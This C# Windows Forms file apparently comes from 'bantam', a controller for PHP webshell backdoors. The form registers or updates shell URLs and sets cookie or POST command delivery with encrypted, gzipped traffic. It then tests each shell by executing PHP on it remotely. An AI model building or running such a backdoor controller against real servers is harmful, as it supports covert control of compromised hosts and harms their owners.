using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Windows.Forms;

using bantam.Classes;

namespace bantam.Forms
{
    public partial class ModifyShell : Form
    {
        /// <summary>
        /// The url of the shell that promted the modify shell form to be opened
        /// </summary>
        private static string g_CallingShellUrl = string.Empty;

        /// <summary>
        /// 
        /// </summary>
        private static readonly ReadOnlyCollection<string> requestTypes = new List<string> {
            "cookie",
            "post",
        }.AsReadOnly();
     
        /// <summary>
        /// 
        /// </summary>
        public void IntitalizeFormControls()
        {
            foreach (var item in requestTypes) {
                comboBoxVarType.Items.Add(item);
            }

            foreach (var item in CryptoHelper.encryptoModeStrings) {
                comboBoxEncryptionMode.Items.Add(item);
            }
        }

        /// <summary>
        /// Add shell constructor
        /// </summary>
        public ModifyShell()
        {
            InitializeComponent();

            IntitalizeFormControls();

            comboBoxVarType.SelectedIndex = 0;
            comboBoxEncryptionMode.SelectedIndex = 0;

            labelDynAddHostsStatus.Text = "";
        }

        /// <summary>
        /// Update / Edit Shell Constructor
        /// </summary>
        /// <param name="shellUrl"></param>
        /// <param name="varName"></param>
        /// <param name="varType"></param>
        public ModifyShell(string shellUrl, string varName, string varType)
        {
            InitializeComponent();

            IntitalizeFormControls();

            Text = "Update Shell";

            g_CallingShellUrl = shellUrl;
            txtBoxShellUrl.Text = shellUrl;

            txtBoxArgName.Text = varName;

            if (BantamMain.Shells.ContainsKey(shellUrl)) {
                checkBoxGZipRequest.Checked = BantamMain.Shells[shellUrl].GzipRequestData;
                checkBoxResponseEncryption.Checked = BantamMain.Shells[shellUrl].ResponseEncryption;
                comboBoxEncryptionMode.SelectedIndex = BantamMain.Shells[shellUrl].ResponseEncryptionMode;

                checkBoxEncryptRequest.Checked = BantamMain.Shells[shellUrl].RequestEncryption;
                if (checkBoxEncryptRequest.Checked) {
                    checkBoxSendIVInRequest.Checked = (string.IsNullOrEmpty(BantamMain.Shells[shellUrl].RequestEncryptionIV)) ? true : false;
                    textBoxEncrpytionIV.Text = BantamMain.Shells[shellUrl].RequestEncryptionIV;
                    textBoxEncrpytionKey.Text = BantamMain.Shells[shellUrl].RequestEncryptionKey;
                    textBoxIVVarName.Text = BantamMain.Shells[shellUrl].RequestEncryptionIVRequestVarName;
                }
            }

            //todo should default to post?
            if (requestTypes.Contains(varType)) {
                comboBoxVarType.SelectedIndex = requestTypes.IndexOf(varType);
            } else {
                comboBoxVarType.SelectedIndex = 0;
            }

            btnAddShell.Visible = false;
            btnUpdateShell.Visible = true;
            labelDynAddHostsStatus.Text = "";
        }

        /// <summary>
        /// Constructor called from backdoor generator
        /// </summary>
        /// <param name="shellUrl"></param>
        /// <param name="varName"></param>
        /// <param name="varType"></param>
        /// <param name="gzipRequestData"></param>
        /// <param name="encryptResponse"></param>
        /// <param name="responseEncryptionMode"></param>
        /// <param name="encryptRequest"></param>
        /// <param name="requestEncryptionIV"></param>
        /// <param name="requestEncryptionKey"></param>
        /// <param name="requestEncryptionIvVarName"></param>
        public ModifyShell(string varName, string varType, bool gzipRequestData, bool encryptRequest, 
                           string requestEncryptionIV, string requestEncryptionKey, string requestEncryptionIvVarName, bool tcheckBoxSendIVInRequest, string encryptionType)
        {
            InitializeComponent();
            IntitalizeFormControls();

            txtBoxArgName.Text = varName;
            checkBoxGZipRequest.Checked = gzipRequestData;

            //checkBoxResponseEncryption.Checked = encryptResponse;
            //comboBoxEncryptionMode.SelectedIndex = responseEncryptionMode;

            checkBoxEncryptRequest.Checked = encryptRequest;
            if (checkBoxEncryptRequest.Checked) {
                checkBoxSendIVInRequest.Checked = tcheckBoxSendIVInRequest;

                if (!checkBoxSendIVInRequest.Checked) {
                    textBoxEncrpytionIV.Enabled = true;
                    textBoxIVVarName.Enabled = false;
                } else {
                    textBoxEncrpytionIV.Enabled = false;
                    textBoxIVVarName.Enabled = true;
                }

                textBoxEncrpytionIV.Text = requestEncryptionIV;
                textBoxEncrpytionKey.Text = requestEncryptionKey;
                textBoxIVVarName.Text = requestEncryptionIvVarName;
            }

            //todo should default to post?
            if (requestTypes.Contains(varType)) {
                comboBoxVarType.SelectedIndex = requestTypes.IndexOf(varType);
            } else {
                comboBoxVarType.SelectedIndex = 0;
            }

            if (CryptoHelper.encryptoModeStrings.Contains(encryptionType)) {
                comboBoxEncryptionMode.SelectedIndex = CryptoHelper.encryptoModeStrings.IndexOf(encryptionType);
            } else {
                comboBoxEncryptionMode.SelectedIndex = 0;
            }

            labelDynAddHostsStatus.Text = "";
        }

        /// <summary>
        /// Main add shell/host To GUI routine
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnAddShell_Click(object sender, EventArgs e)
        {
            string shellURL = txtBoxShellUrl.Text;

            if (string.IsNullOrEmpty(shellURL)) {
                return;
            }

            if (checkBoxEncryptRequest.Checked) {
                string encryptionKey = textBoxEncrpytionKey.Text;

                if (encryptionKey.Length != 32) {
                    labelDynAddHostsStatus.Text = "Encryption key length must be 32 charectors... Try again.";
                    return;
                }

                if (!checkBoxSendIVInRequest.Checked) {
                    string encryptionIV = textBoxEncrpytionIV.Text;

                    if (string.IsNullOrEmpty(encryptionIV) || encryptionIV.Length != 16) {
                        labelDynAddHostsStatus.Text = "Encryption IV length must be 16 charectors... Try again.";
                        return;
                    }
                }
            }

            //Remove Shell
            if (BantamMain.Shells.ContainsKey(shellURL)) {
                BantamMain.Instance.GuiCallbackRemoveShellURL(shellURL);

                if (!BantamMain.Shells.TryRemove(shellURL, out ShellInfo shellInfoOut)) {
                    LogHelper.AddGlobalLog("Unable to remove (" + shellURL + ") from shells", "AddShell failure", LogHelper.LOG_LEVEL.ERROR);
                    return;
                }
            }

            //Add Shell
            if (!BantamMain.Shells.TryAdd(shellURL, new ShellInfo())) {
                LogHelper.AddGlobalLog("Unable to add (" + shellURL + ") to shells", "AddShell failure", LogHelper.LOG_LEVEL.ERROR);
                return;
            }

            BantamMain.Shells[shellURL].RequestArgName = txtBoxArgName.Text;

            if (comboBoxVarType.Text == "cookie") {
                BantamMain.Shells[shellURL].SendDataViaCookie = true;
            }

            if (checkBoxResponseEncryption.Checked == false) {
                BantamMain.Shells[shellURL].ResponseEncryption = false;
            } else {
                BantamMain.Shells[shellURL].ResponseEncryption = true;
                BantamMain.Shells[shellURL].ResponseEncryptionMode = comboBoxEncryptionMode.SelectedIndex;
            }

            if (checkBoxGZipRequest.Checked) {
                BantamMain.Shells[shellURL].GzipRequestData = true;
            } else {
                BantamMain.Shells[shellURL].GzipRequestData = false;
            }

            bool encryptResponse = BantamMain.Shells[shellURL].ResponseEncryption;
            int ResponseEncryptionMode = BantamMain.Shells[shellURL].ResponseEncryptionMode;

            if (checkBoxEncryptRequest.Checked) {
                BantamMain.Shells[shellURL].RequestEncryption = true;
                BantamMain.Shells[shellURL].RequestEncryptionKey = textBoxEncrpytionKey.Text;

                if (checkBoxSendIVInRequest.Checked) {
                    BantamMain.Shells[shellURL].SendRequestEncryptionIV = true;
                    BantamMain.Shells[shellURL].RequestEncryptionIV = string.Empty;
                    BantamMain.Shells[shellURL].RequestEncryptionIVRequestVarName = textBoxIVVarName.Text;
                } else {
                    BantamMain.Shells[shellURL].RequestEncryptionIV = textBoxEncrpytionIV.Text;
                    BantamMain.Shells[shellURL].RequestEncryptionIVRequestVarName = string.Empty;
                }
            } else {
                BantamMain.Shells[shellURL].RequestEncryption = false;
                BantamMain.Shells[shellURL].RequestEncryptionIVRequestVarName = string.Empty;
                BantamMain.Shells[shellURL].RequestEncryptionIV = string.Empty;
                BantamMain.Shells[shellURL].RequestEncryptionKey = string.Empty;
            }

            string phpCode = PhpBuilder.PhpTestExecutionWithEcho1(encryptResponse);
            ResponseObject response = await WebRequestHelper.ExecuteRemotePHP(shellURL, phpCode);

            if (string.IsNullOrEmpty(response.Result)) {
                labelDynAddHostsStatus.Text = "Unable to connect, check your settings and try again.";
                return;
            }

            string result = response.Result;

            if (encryptResponse) {
                result = CryptoHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, ResponseEncryptionMode);
            }

            if (string.IsNullOrEmpty(result)) {
                labelDynAddHostsStatus.Text = "Unable to connect, check your settings and try again.";
                return;
            }

            BantamMain.Instance.InitializeShellData(shellURL);

            this.Close();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnUpdateShell_Click(object sender, EventArgs e)
        {
            btnAddShell_Click(sender, e);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void checkBoxResponseEncryption_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBoxResponseEncryption.Checked) {
                comboBoxEncryptionMode.Enabled = true;
            } else {
                comboBoxEncryptionMode.Enabled = false;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonRandomIV_Click(object sender, EventArgs e)
        {
            textBoxEncrpytionIV.Text = CryptoHelper.GetRandomEncryptionIV();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonRandomKey_Click(object sender, EventArgs e)
        {
            textBoxEncrpytionKey.Text = CryptoHelper.GetRandomEncryptionKey();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void checkBoxSendIVInRequest_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBoxSendIVInRequest.Checked) {
                textBoxEncrpytionIV.Enabled = false;
                textBoxIVVarName.Enabled = true;
            } else {
                textBoxEncrpytionIV.Enabled = true;
                textBoxIVVarName.Enabled = false;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void checkBoxEncryptRequest_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBoxEncryptRequest.Checked) {
                textBoxEncrpytionIV.Enabled = true;
                textBoxEncrpytionKey.Enabled = true;
                checkBoxSendIVInRequest.Enabled = true;
                buttonRandomIV.Enabled = true;
                buttonRandomKey.Enabled = true;
            } else {
                textBoxEncrpytionIV.Enabled = false;
                textBoxEncrpytionKey.Enabled = false;
                textBoxIVVarName.Enabled = false;
                buttonRandomIV.Enabled = false;
                checkBoxSendIVInRequest.Enabled = false;
                buttonRandomKey.Enabled = false;
            }
        }
    }
}
